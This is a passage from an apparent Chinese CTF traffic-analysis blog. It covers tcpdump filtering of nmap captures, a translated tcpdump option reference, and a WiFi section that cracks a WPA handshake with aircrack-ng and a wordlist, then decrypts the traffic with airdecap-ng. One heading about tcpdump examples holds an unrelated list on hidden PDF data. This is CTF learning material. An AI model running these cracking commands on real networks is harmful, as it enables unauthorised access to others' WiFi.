/usr/sbin/tcpdump  -n -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.22</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.3306</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.631</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.801</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line">localhost<span class="number">.801</span></span><br><span class="line">localhost.ftp</span><br><span class="line">localhost.ipp</span><br><span class="line">localhost.mysql</span><br><span class="line">localhost.ssh</span><br></pre></td></tr></table></figure><h3 id="输出分析"><a href="#输出分析" class="headerlink" title="输出分析"></a>输出分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpdump -r attachment.pcapng | head -n 10</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:<span class="number">29</span>:<span class="number">32.848771</span> IP <span class="number">192.168</span><span class="number">.10</span><span class="number">.212</span><span class="number">.43424</span> &gt; li370<span class="number">-223.</span>members.linode.com.https: Flags [S], seq <span class="number">3990734865</span>, win <span class="number">29200</span>, options [mss <span class="number">1460</span>,sackOK,TS val <span class="number">668024057</span> ecr <span class="number">0</span>,nop,wscale <span class="number">7</span>], length <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>packet <strong>时间戳</strong>，例如 <code>02:52:44.513700</code> 表示抓到这个包的时间是** 02 时 52 分 44 秒 513 毫秒**</li><li>packet <strong>类型</strong>，这里是 <code>IP</code> 包</li><li>源 (SRC) IP 和端口，目的 (DST) IP 和端口</li><li>packet TCP flags，其中<ul><li><code>S</code> 表示 <code>syn</code> 包</li><li><code>.</code> 表示 <code>ack</code> 包</li><li><code>F</code> 表示 <code>fin</code> 包</li><li><code>P</code> 表示 <code>push</code> 包（发送正常数据）</li></ul></li><li>序列号（seq）</li><li>应答号（ack）</li><li>包的 payload 长度</li><li>包的部分内容（ASCII）</li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.默认情况下，tcpdump抓包结果中将进行域名解析，显示的是域名地址而非ip地址，使用-n选项，可指定显示ip地址</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 &#39;-&#39; 符号, 则tcpdump 会从标准输入中读取包数据.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">-A  以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含</span><br><span class="line">    网页数据的数据包时, 可方便查看数据(nt: 即Handy <span class="keyword">for</span> capturing web pages).</span><br><span class="line">-c  count</span><br><span class="line">    tcpdump将在接受到count个数据包后退出.</span><br><span class="line">-C  file-size</span><br><span class="line">    (nt: 此选项用于配合-w file 选项使用)</span><br><span class="line">    该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件,</span><br><span class="line">    另创一个文件继续用于原始数据包的记录. 新创建的文件名与-w 选项指定的文件名一致, 但文件名后多了一个数字.</span><br><span class="line">    该数字会从<span class="number">1</span>开始随着新创建文件的增多而增加. file-size的单位是百万字节(nt: 这里指<span class="number">1</span>,<span class="number">000</span>,<span class="number">000</span>个字节,</span><br><span class="line">    并非<span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>个字节, 后者是以<span class="number">1024</span>字节为<span class="number">1</span>k, <span class="number">1024</span>k字节为<span class="number">1</span>M计算所得, 即<span class="number">1</span>M=<span class="number">1024</span> ＊ <span class="number">1024</span> ＝ <span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>)</span><br><span class="line">-d  以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的,</span><br><span class="line">    通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-matching code, 包匹配码,含义未知, 需补充)</span><br><span class="line">-dd 以C语言的形式打印出包匹配码.</span><br><span class="line">-ddd    以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的<span class="string">&#x27;count&#x27;</span>前缀).</span><br><span class="line">-D  打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口</span><br><span class="line">    描述. 其中网络接口名字和数字编号可以用在tcpdump 的-i flag 选项(nt: 把名字或数字代替flag), 来指定要在其上抓包的网络</span><br><span class="line">    接口.</span><br><span class="line">    此选项在不支持接口列表命令的系统上很有用(nt: 比如, Windows 系统, 或缺乏 ifconfig -a 的UNIX系统); 接口的数字</span><br><span class="line">    编号在windows <span class="number">2000</span> 或其后的系统中很有用, 因为这些系统上的接口名字比较复杂, 而不易使用.</span><br><span class="line">    如果tcpdump编译时所依赖的libpcap库太老,-D 选项不会被支持, 因为其中缺乏 pcap_findalldevs()函数.</span><br><span class="line">-e  每行的打印输出中将包括数据包的数据链路层头部信息</span><br><span class="line">-E  spi@ipaddr algo:secret,...</span><br><span class="line">    可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt | rt:IPsec Encapsulating Security Payload,</span><br><span class="line">    IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据,</span><br><span class="line">    前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充).</span><br><span class="line">    需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）.</span><br><span class="line">    可用于加密的算法包括des-cbc, <span class="number">3</span>des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none).</span><br><span class="line">    默认的是des-cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充).</span><br><span class="line">    secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 <span class="number">0</span>x 开头, 该密钥将以<span class="number">16</span>进制方式读入.</span><br><span class="line">    该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来</span><br><span class="line">    使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到.</span><br><span class="line">    除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用</span><br><span class="line">    (nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP　包时会打开此</span><br><span class="line">    文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时,</span><br><span class="line">    不至于造成过大损害).</span><br><span class="line">-f  显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字.</span><br><span class="line">    (此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会</span><br><span class="line">    用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环).</span><br><span class="line">    由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口)</span><br><span class="line">    及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络</span><br><span class="line">    掩码(nt: linux 下的 <span class="string">&#x27;any&#x27;</span> 网络接口就不需要设置地址和掩码, 不过此<span class="string">&#x27;any&#x27;</span>接口可以收到系统中所有接口的</span><br><span class="line">    数据包), 该选项不能正常工作.</span><br><span class="line">-F  file</span><br><span class="line">    使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.</span><br><span class="line">-i  interface</span><br><span class="line">    指定tcpdump 需要监听的接口.  如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口).</span><br><span class="line">    一但找到第一个符合条件的接口, 搜寻马上结束.</span><br><span class="line">    在采用<span class="number">2.2</span>版本或之后版本内核的Linux 操作系统上, <span class="string">&#x27;any&#x27;</span> 这个虚拟网络接口可被用来接收所有网络接口上的数据包</span><br><span class="line">    (nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在<span class="string">&#x27;混杂&#x27;</span>模式(promiscuous)下,</span><br><span class="line">    则无法在<span class="string">&#x27;any&#x27;</span>这个虚拟的网络接口上抓取其数据包.</span><br><span class="line">    如果 -D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.</span><br><span class="line">-l  对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来).</span><br><span class="line">    在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的:</span><br><span class="line">    ``tcpdump  -l  |  tee dat<span class="string">&#x27;&#x27;</span> 或者 ``tcpdump  -l   &gt; dat  &amp;  tail  -f  dat<span class="string">&#x27;&#x27;</span>.</span><br><span class="line">    (nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作<span class="string">&#x27;&gt;&#x27;</span>, 把tcpdump的输出放到</span><br><span class="line">    dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)</span><br><span class="line">-L  列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-i 来指定)</span><br><span class="line">-m  module</span><br><span class="line">    通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构</span><br><span class="line">    MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco)</span><br><span class="line">    协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充).</span><br><span class="line">    此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.</span><br><span class="line">-M  secret</span><br><span class="line">    如果TCP 数据包(TCP segments)有TCP-MD5选项(在RFC <span class="number">2385</span>有相关描述), 则为其摘要的验证指定一个公共的密钥secret.</span><br><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.</span><br><span class="line">-N  不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印<span class="string">&#x27;nic&#x27;</span> 而不是 <span class="string">&#x27;nic.ddn.mil&#x27;</span>.</span><br><span class="line">-O  不启用进行包匹配时所用的优化代码. 当怀疑某些bug是由优化代码引起的, 此选项将很有用.</span><br><span class="line">-p  一般情况下, 把网络接口设置为非<span class="string">&#x27;混杂&#x27;</span>模式. 但必须注意 , 在特殊情况下此网络接口还是会以<span class="string">&#x27;混杂&#x27;</span>模式来工作； 从而, <span class="string">&#x27;-p&#x27;</span> 的设与不设,</span><br><span class="line">    不能当做以下选现的代名词:</span><br><span class="line">    <span class="string">&#x27;ether host &#123;local-hw-add&#125;&#x27;</span> 或  <span class="string">&#x27;ether broadcast&#x27;</span>(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).</span><br><span class="line">-q  快速(也许用&#x27;安静&#x27;更好?)打印输出. 即打印很少的协议相关信息, 从而输出行都比较简短.</span><br><span class="line">-R  设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装,</span><br><span class="line">    这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出<span class="string">&#x27;禁止中继&#x27;</span>域(nt: relay prevention field). 另外,</span><br><span class="line">     由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域,</span><br><span class="line">    所以tcpdump不能从收到的ESP/AH数据包中推导出协议版本号.</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 <span class="string">&#x27;-&#x27;</span> 符号, 则tcpdump 会从标准输入中读取包数据.</span><br><span class="line">-S  打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距,</span><br><span class="line">    比如, 接受方收到第一个数据包的绝对顺序号为<span class="number">232323</span>, 对于后来接收到的第<span class="number">2</span>个,第<span class="number">3</span>个数据包, tcpdump会打印其序列号为<span class="number">1</span>, <span class="number">2</span>分别</span><br><span class="line">    表示与第一个数据包的差距为<span class="number">1</span> 和 <span class="number">2.</span> 而如果此时-S 选项被设置, 对于后来接收到的第<span class="number">2</span>个, 第<span class="number">3</span>个数据包会打印出其绝对顺序号:</span><br><span class="line">    <span class="number">232324</span>, <span class="number">232325</span>).</span><br><span class="line">-s  snaplen</span><br><span class="line">    设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是<span class="number">68</span>字节(而支持网络接口分接头(nt: NIT, 上文已有描述,</span><br><span class="line">    可搜索<span class="string">&#x27;网络接口分接头&#x27;</span>关键字找到那里)的SunOS系列操作系统中默认的也是最小值是<span class="number">96</span>).</span><br><span class="line">    <span class="number">68</span>字节对于IP, ICMP(nt: Internet Control Message Protocol,</span><br><span class="line">    因特网控制报文协议), TCP 以及 UDP 协议的报文已足够, 但对于名称服务(nt: 可理解为dns, nis等服务), NFS服务相关的</span><br><span class="line">    数据包会产生包截短. 如果产生包截短这种情况, tcpdump的相应打印输出行中会出现<span class="string">&#x27;&#x27;</span>[|proto]<span class="string">&#x27;&#x27;</span>的标志（proto 实际会显示为</span><br><span class="line">    被截短的数据包的相关协议层次). 需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少</span><br><span class="line">    tcpdump 可缓存的数据包的数量， 从而会导致数据包的丢失. 所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好.</span><br><span class="line">    把snaplen 设置为<span class="number">0</span> 意味着让tcpdump自动选择合适的长度来抓取数据包.</span><br><span class="line">-T  type</span><br><span class="line">    强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:</span><br><span class="line">    aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),</span><br><span class="line">    cnfp (Cisco  NetFlow  protocol),  rpc(Remote Procedure Call), rtp (Real-Time Applications protocol),</span><br><span class="line">    rtcp (Real-Time Applications con-trol protocol), snmp (Simple Network Management Protocol),</span><br><span class="line">    tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电</span><br><span class="line">    视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).</span><br><span class="line">-t     在每行输出中不打印时间戳</span><br><span class="line">-tt    不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成<span class="number">1261798315</span>)</span><br><span class="line">-ttt   tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)</span><br><span class="line">-tttt  在每行打印的时间戳之前添加日期的打印</span><br><span class="line">-u     打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)</span><br><span class="line">-U    使得当tcpdump在使用-w 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中,</span><br><span class="line">      而不是等文件的输出缓冲已满时才真正写入此文件)</span><br><span class="line">       -U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.</span><br><span class="line">-v    当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性</span><br><span class="line">      检测, 比如对IP或ICMP包头部的校验和.</span><br><span class="line">-vv   产生比-v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.</span><br><span class="line">-vvv  产生比-vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面,</span><br><span class="line">      其相应的图形选项将会以<span class="number">16</span>进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).</span><br><span class="line">-w    把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-r 选项来重新读入并进行分析和打印.</span><br><span class="line">-W    filecount</span><br><span class="line">      此选项与-C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当</span><br><span class="line">      于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的<span class="number">0</span>, 这可以方便这些</span><br><span class="line">      文件被正确的排序.</span><br><span class="line">-x    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长,</span><br><span class="line">      并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so <span class="keyword">for</span> link  layers  that</span><br><span class="line">      pad, 未能衔接理解和翻译, 需补充 )</span><br><span class="line">-xx   tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">-X    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-XX   当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-y    datalinktype</span><br><span class="line">      设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包</span><br><span class="line">-Z    user</span><br><span class="line">      使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的</span><br><span class="line">      用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程)</span><br><span class="line">      此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充)</span><br></pre></td></tr></table></figure><h2 id="Tcpdump常用命令实例"><a href="#Tcpdump常用命令实例" class="headerlink" title="Tcpdump常用命令实例"></a>Tcpdump常用命令实例</h2><ul><li>不可见的图层</li><li>Adobe的元数据格式‘XMP’</li><li>Adobe的XMP元数据</li><li>PDF的‘增量生成’功能允许保留用户不可见的前版本信息</li><li>白色的文字或背景图</li><li>图片背后的文字信息</li><li>图层后面被覆盖的另一个图层</li><li>不显示的注释层。</li></ul><h2 id="Wifi破解"><a href="#Wifi破解" class="headerlink" title="Wifi破解"></a>Wifi破解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng ctf.pcap -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">airdecap-ng ctf.pcap -e ctf -p password1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng -w passwd.txt shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line">Choosing first network as target.</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">                               Aircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:00:00] 1&#x2F;1 keys tested (37.17 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: --</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 88888888 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 </span><br><span class="line">                       0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F </span><br><span class="line"></span><br><span class="line">      Transient Key  : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F </span><br><span class="line">                       25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C </span><br><span class="line">                       8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD </span><br><span class="line">                       2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">#注意ESSID</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br></pre></td></tr></table></figure><p><code>-e</code>后面的为<code>ESSID</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ airdecap-ng -e <span class="number">0719</span> -p <span class="number">88888888</span> shipin.cap</span><br><span class="line">Total number of stations seen            <span class="number">6</span></span><br><span class="line">Total number of packets read         <span class="number">16664</span></span><br><span class="line">Total number of WEP data packets         <span class="number">0</span></span><br><span class="line">Total number of WPA data packets        <span class="number">27</span></span><br><span class="line">Number of plaintext data packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of corrupted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WPA  packets        <span class="number">16</span></span><br><span class="line">Number of bad TKIP (WPA) packets         <span class="number">0</span></span><br><span class="line">Number of bad CCMP (WPA) packets         <span class="number">0</span></span><br></pre></td></tr></table></figure><p>之后会解出来一个压缩包。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网学习--Powershell使用</title>
      <link href="2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"/>
      <url>2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/</url>
      
